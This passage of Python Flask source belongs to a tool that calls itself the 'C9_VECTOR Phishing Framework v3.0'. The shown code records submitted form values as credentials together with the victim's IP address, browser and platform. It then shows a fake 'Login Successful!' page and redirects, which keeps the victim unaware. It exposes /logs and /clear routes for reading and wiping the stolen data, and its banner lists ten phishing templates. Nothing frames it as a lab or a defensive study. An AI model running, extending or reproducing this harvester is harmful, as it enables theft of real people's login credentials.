        credentials[key] = value
    
    # Get client information
    ip = get_client_ip()
    user_agent = request.headers.get('User-Agent', 'Unknown')
    platform = request.headers.get('Sec-CH-UA-Platform', request.headers.get('Platform', 'Unknown'))
    
    # Save credentials
    save_credentials({
        'ip': ip,
        'user_agent': user_agent,
        'platform': platform,
        'credentials': credentials
    })
    
    # Return success page with redirect
    return '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Success</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0a0a0a; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #ffffff; }
        .container { text-align: center; padding: 40px; }
        .icon { font-size: 80px; margin-bottom: 20px; }
        .title { font-size: 32px; margin-bottom: 10px; }
        .subtitle { color: #888; font-size: 16px; margin-bottom: 30px; }
        .btn { padding: 12px 40px; background: #ff0000; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; text-decoration: none; display: inline-block; transition: background 0.2s; }
        .btn:hover { background: #cc0000; }
        .c9-vector { position: fixed; bottom: 10px; right: 15px; color: rgba(255,255,255,0.05); font-size: 12px; font-family: monospace; letter-spacing: 2px; user-select: none; pointer-events: none; }
    </style>
</head>
<body>
    <div class="c9-vector">C9_VECTOR</div>
    <div class="container">
        <div class="icon">✅</div>
        <div class="title">Login Successful!</div>
        <div class="subtitle">You will be redirected shortly...</div>
        <a href="/" class="btn">Return Home</a>
    </div>
    <script>setTimeout(function(){ window.location.href = '/'; }, 3000);</script>
</body>
</html>
    '''

@app.route('/logs')
def view_logs():
    """View captured logs (JSON)"""
    return jsonify(CAPTURED_DATA)

@app.route('/clear')
def clear_logs():
    """Clear all captured logs"""
    global CAPTURED_DATA
    CAPTURED_DATA = []
    open(LOG_FILE, 'w').close()
    return jsonify({'status': 'cleared', 'message': 'All logs cleared'})

# ============================================
# MAIN
# ============================================

if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════════╗
    ║  C9_VECTOR Phishing Framework v3.0       ║
    ║  10 Templates Loaded                     ║
    ║  http://localhost:5000                   ║
    ╚═══════════════════════════════════════════╝
    """)
    
    print("[+] Available Templates:")
    for key, value in TEMPLATES.items():
        print(f"    {value['logo']} {value['name']} - /{key}")
    
    print(f"\n[+] Logs saved to: {LOG_FILE}")
    print("[+] View logs: http://localhost:5000/logs")
    print("[+] Clear logs: http://localhost:5000/clear")
    print("\n[+] Server running on http://localhost:5000")
    print("[+] Press Ctrl+C to stop\n")
    
    app.run(host='0.0.0.0', port=5000, debug=False)